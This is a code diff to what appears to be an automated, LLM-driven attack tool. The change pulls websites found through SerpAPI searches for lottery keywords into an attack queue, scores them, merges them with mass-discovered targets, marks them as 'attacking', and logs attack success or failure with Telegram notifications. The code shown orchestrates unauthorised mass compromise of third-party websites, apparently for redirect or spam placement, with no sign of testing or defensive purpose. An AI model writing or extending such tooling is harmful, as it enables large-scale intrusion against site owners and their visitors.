@@ -21,6 +21,7 @@ import { getDb } from "./db";
 import { agenticSessions, redirectUrlPool, autonomousDeploys } from "../drizzle/schema";
 import { eq, desc, and, sql } from "drizzle-orm";
 import { runMassDiscovery, type DiscoveryConfig, type DiscoveredTarget } from "./mass-target-discovery";
+import { getQueuedTargets, updateTargetStatus } from "./keyword-target-discovery";
 import { startBackgroundJob, getJobStatus } from "./job-runner";
 import { sendTelegramNotification } from "./telegram-notifier";
 import { invokeLLM } from "./_core/llm";
@@ -403,6 +404,43 @@ async function runAgenticLoop(
       },
     };
     
+    // ═══ KEYWORD DISCOVERY TARGETS (SerpAPI lottery keywords) ═══
+    let keywordTargets: DiscoveredTarget[] = [];
+    try {
+      const kwTargets = await getQueuedTargets(Math.min(maxTargets, 30));
+      if (kwTargets.length > 0) {
+        await emitEvent("discovery", `🎯 พบ ${kwTargets.length} เป้าหมายจาก Keyword Discovery (SerpAPI)`, 8);
+        keywordTargets = kwTargets.map((kt, idx) => ({
+          id: `kw-${kt.id}`,
+          domain: kt.domain,
+          url: kt.url,
+          source: "serpapi" as const,
+          sourceQuery: kt.keyword,
+          category: "keyword_discovery",
+          hasOpenUpload: false,
+          hasExposedConfig: false,
+          hasExposedAdmin: false,
+          hasWritableDir: false,
+          hasVulnerableCms: false,
+          hasWeakAuth: false,
+          vulnScore: 50 - (kt.serpPosition ?? 50), // Higher SERP = lower score
+          attackDifficulty: "medium" as const,
+          estimatedSuccessRate: 30,
+          priorityRank: idx + 1,
+          discoveredAt: Date.now(),
+          status: "new" as const,
+          notes: [`From keyword: ${kt.keyword}`, `SERP position: ${kt.serpPosition ?? "N/A"}`],
+          _keywordTargetId: kt.id, // Track for status update
+        }));
+        // Mark as attacking
+        for (const kt of kwTargets) {
+          await updateTargetStatus(kt.id, "attacking").catch(() => {});
+        }
+      }
+    } catch (e: any) {
+      await emitEvent("discovery", `⚠️ Keyword discovery targets error: ${e.message}`, 8);
+    }
+
     let discoveryResult;
     try {
       discoveryResult = await runMassDiscovery(discoveryConfig);
@@ -411,7 +449,11 @@ async function runAgenticLoop(
       discoveryResult = { targets: [], errors: [e.message], totalQueriesRun: 0, totalRawResults: 0, totalAfterDedup: 0, totalAfterFilter: 0, totalScored: 0, id: "", startedAt: Date.now(), status: "error" as const };
     }
     
-    const rawTargets = discoveryResult.targets
+    // Merge keyword targets with mass discovery targets (keyword targets first)
+    const rawTargets = [
+      ...keywordTargets,
+      ...discoveryResult.targets,
+    ]
       .sort((a, b) => b.vulnScore - a.vulnScore)
       .slice(0, maxTargets);
     
@@ -499,6 +541,14 @@ async function runAgenticLoop(
           successCount++;
         } else {
           failCount++;
+        }
+        // Update keyword discovery target status if applicable
+        const kwTargetId = (result.target as any)?._keywordTargetId;
+        if (kwTargetId) {
+          updateTargetStatus(kwTargetId, result.success ? "success" : "failed", {
+            attackSessionId: sessionId,
+            attackResult: result.success ? "Attack succeeded" : (result.reason || "Attack failed"),
+          }).catch(() => {});
         }
       }
       
